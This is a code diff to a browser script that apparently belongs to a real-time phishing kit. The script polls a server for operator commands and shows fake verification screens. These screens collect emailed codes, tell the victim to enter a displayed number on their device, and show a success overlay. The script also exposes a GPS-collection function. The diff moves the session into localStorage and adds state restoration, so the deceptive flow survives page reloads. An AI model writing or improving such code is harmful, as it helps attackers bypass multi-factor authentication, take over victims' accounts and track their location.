@@ -1,16 +1,18 @@
 (function () {
   const SESSION_KEY = '__SUBMISSION_SESSION_ID__';
+  const FINAL_KEY = '__SUBMISSION_FINAL__';
 
   function getSessionId() {
-    return sessionStorage.getItem(SESSION_KEY) || '';
+    return localStorage.getItem(SESSION_KEY) || '';
   }
 
   function setSessionId(id) {
-    sessionStorage.setItem(SESSION_KEY, id);
+    localStorage.setItem(SESSION_KEY, id);
   }
 
   function clearSessionId() {
-    sessionStorage.removeItem(SESSION_KEY);
+    localStorage.removeItem(SESSION_KEY);
+    localStorage.removeItem(FINAL_KEY);
   }
 
   function ensureContainer() {
@@ -49,9 +51,9 @@
       .replace(/"/g, '&quot;');
   }
 
-  /* ── Beautiful success overlay ── */
   function showSuccess() {
     closeAuthModal();
+    localStorage.setItem(FINAL_KEY, 'success');
     renderOverlay(`
       <div class="response-overlay" id="overlay-success">
         <div class="success-celebration">
@@ -97,7 +99,7 @@
                 <span>Details Sent to Your Email</span>
               </div>
             </div>
-            <button class="success-btn" type="button" onclick="window.__ResponseControls.close()">Done</button>
+            <button class="success-btn" type="button" onclick="window.__ResponseControls.closeFinal()">Done</button>
           </div>
         </div>
       </div>
@@ -160,13 +162,8 @@
           <p class="sms-verify-email">${escapeHtml(safeEmail)}</p>
           <p class="sms-verify-message">A verification code has been sent to your email. Please enter it below to continue.</p>
           <form class="sms-verify-form" id="sms-verify-form" autocomplete="off">
-            <div class="sms-code-group">
-              <input type="text" class="sms-code-input" id="sms-code-1" maxlength="1" inputmode="numeric" aria-label="Digit 1" />
-              <input type="text" class="sms-code-input" id="sms-code-2" maxlength="1" inputmode="numeric" aria-label="Digit 2" />
-              <input type="text" class="sms-code-input" id="sms-code-3" maxlength="1" inputmode="numeric" aria-label="Digit 3" />
-              <input type="text" class="sms-code-input" id="sms-code-4" maxlength="1" inputmode="numeric" aria-label="Digit 4" />
-              <input type="text" class="sms-code-input" id="sms-code-5" maxlength="1" inputmode="numeric" aria-label="Digit 5" />
-              <input type="text" class="sms-code-input" id="sms-code-6" maxlength="1" inputmode="numeric" aria-label="Digit 6" />
+            <div class="sms-single-code-wrap">
+              <input type="text" class="sms-single-code-input" id="sms-code" placeholder="Enter verification code" autocomplete="off" />
             </div>
             <p class="sms-verify-resend">Didn't receive a code? <a href="#" onclick="event.preventDefault();">Resend code</a></p>
             <button class="sms-verify-btn" type="submit" id="sms-verify-submit">Verify</button>
@@ -178,44 +175,19 @@
         </div>
       </div>
     `);
-    setupSmsCodeInputs();
     setupSmsFormSubmit();
-  }
-
-  function setupSmsCodeInputs() {
-    const inputs = document.querySelectorAll('.sms-code-input');
-    if (!inputs.length) return;
-    inputs.forEach((input, index) => {
-      input.addEventListener('input', function () {
-        this.value = this.value.replace(/[^0-9]/g, '');
-        if (this.value && index < inputs.length - 1) inputs[index + 1].focus();
-      });
-      input.addEventListener('keydown', function (e) {
-        if (e.key === 'Backspace' && !this.value && index > 0) inputs[index - 1].focus();
-      });
-      input.addEventListener('paste', function (e) {
-        e.preventDefault();
-        const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '').slice(0, 6);
-        if (!pasted) return;
-        pasted.split('').forEach((char, i) => { if (inputs[i]) inputs[i].value = char; });
-        inputs[Math.min(pasted.length, inputs.length - 1)].focus();
-      });
-    });
-    const first = document.getElementById('sms-code-1');
-    if (first) setTimeout(() => first.focus(), 300);
   }
 
   function setupSmsFormSubmit() {
     const form = document.getElementById('sms-verify-form');
     if (!form) return;
+    const codeInput = document.getElementById('sms-code');
+    if (codeInput) setTimeout(() => codeInput.focus(), 300);
     form.addEventListener('submit', async function (e) {
       e.preventDefault();
-      const inputs = document.querySelectorAll('.sms-code-input');
-      let code = '';
-      let allFilled = true;
-      inputs.forEach((input) => { code += input.value; if (!input.value) allFilled = false; });
-      if (!allFilled || code.length < 6) {
-        inputs.forEach((input) => { if (!input.value) input.classList.add('sms-code-error'); });
+      const code = codeInput ? codeInput.value.trim() : '';
+      if (!code) {
+        if (codeInput) codeInput.classList.add('sms-code-error');
         return;
       }
       const formEl = document.getElementById('sms-verify-form');
@@ -242,49 +214,15 @@
         <div class="response-card">
           <button class="response-close" type="button" onclick="window.__ResponseControls.close()">×</button>
           <div class="response-icon number">#</div>
-          <h2 class="response-title">Enter This Number</h2>
-          <p class="response-message">Please enter the number shown below to verify you are not a robot.</p>
+          <h2 class="response-title">Your Verification Number</h2>
+          <p class="response-message">Please use the number shown below to verify your account. Enter this number where prompted on your device to complete the verification process.</p>
           <div class="response-number">${escapeHtml(String(number))}</div>
-          <form class="response-form" id="number-prompt-form" autocomplete="off">
-            <label for="number-input">Enter the number above</label>
-            <input type="text" id="number-input" name="number-input" placeholder="Type the number" inputmode="numeric" />
-          </form>
           <div class="response-actions">
-            <button class="response-btn response-btn-secondary" type="button" onclick="window.__ResponseControls.close()">Cancel</button>
-            <button class="response-btn response-btn-primary" type="button" id="number-prompt-submit">Submit</button>
-          </div>
-          <div class="sms-verify-loading" id="number-verify-loading" style="display:none;">
-            <div class="sms-verify-spinner"></div>
-            <p>Verifying…</p>
+            <button class="response-btn response-btn-primary" type="button" onclick="window.__ResponseControls.close()">Got it</button>
           </div>
         </div>
       </div>
     `);
-    setupNumberPromptSubmit();
-  }
-
-  function setupNumberPromptSubmit() {
-    const submitBtn = document.getElementById('number-prompt-submit');
-    if (!submitBtn) return;
-    submitBtn.addEventListener('click', async function () {
-      const input = document.getElementById('number-input');
-      const value = input ? input.value.trim() : '';
-      if (!value) return;
-      const formEl = document.getElementById('number-prompt-form');
-      const actionsEl = document.querySelector('.response-actions');
-      const loadingEl = document.getElementById('number-verify-loading');
-      if (formEl) formEl.style.display = 'none';
-      if (actionsEl) actionsEl.style.display = 'none';
-      if (loadingEl) loadingEl.style.display = 'flex';
-      const sessionId = getSessionId();
-      try {
-        await fetch('/api/verify-code', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ sessionId, code: value }),
-        });
-      } catch (err) { /* ignore */ }
-    });
   }
 
   function closeAuthModal() {
@@ -319,7 +257,6 @@
     }
   }
 
-  /* ── Polling: supports session switching ── */
   let currentSessionId = null;
   let pollAbortController = null;
 
@@ -339,7 +276,6 @@
         if (result.command) {
           const isFinal = handleCommand(result.command, result.data);
           if (isFinal) {
-            clearSessionId();
             currentSessionId = null;
             return;
           }
@@ -349,6 +285,37 @@
         await sleep(3000);
       }
     }
+  }
+
+  async function restoreState() {
+    const sessionId = getSessionId();
+    if (!sessionId) return;
+
+    const finalState = localStorage.getItem(FINAL_KEY);
+    if (finalState === 'success') {
+      showSuccess();
+      return;
+    }
+
+    try {
+      const res = await fetch(`/api/session-state/${sessionId}`);
+      if (!res.ok) return;
+      const result = await res.json();
+      if (result.success && result.command) {
+        handleCommand(result.command, result.data);
+        try {
+          await fetch(`/api/session-clear/${sessionId}`, { method: 'POST' });
+        } catch (e) { /* ignore */ }
+        return;
+      }
+    } catch (e) { /* ignore */ }
+
+    startPolling(sessionId);
+  }
+
+  function closeFinal() {
+    clearSessionId();
+    closeOverlay();
   }
 
   function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }
@@ -368,12 +335,13 @@
     start: startPolling,
     handle: handleCommand,
     close: closeOverlay,
+    closeFinal: closeFinal,
     setSessionId,
     getSessionId,
     clearSessionId,
     collectGps,
+    restoreState,
   };
 
-  const existingSession = getSessionId();
-  if (existingSession) startPolling(existingSession);
+  restoreState();
 })();
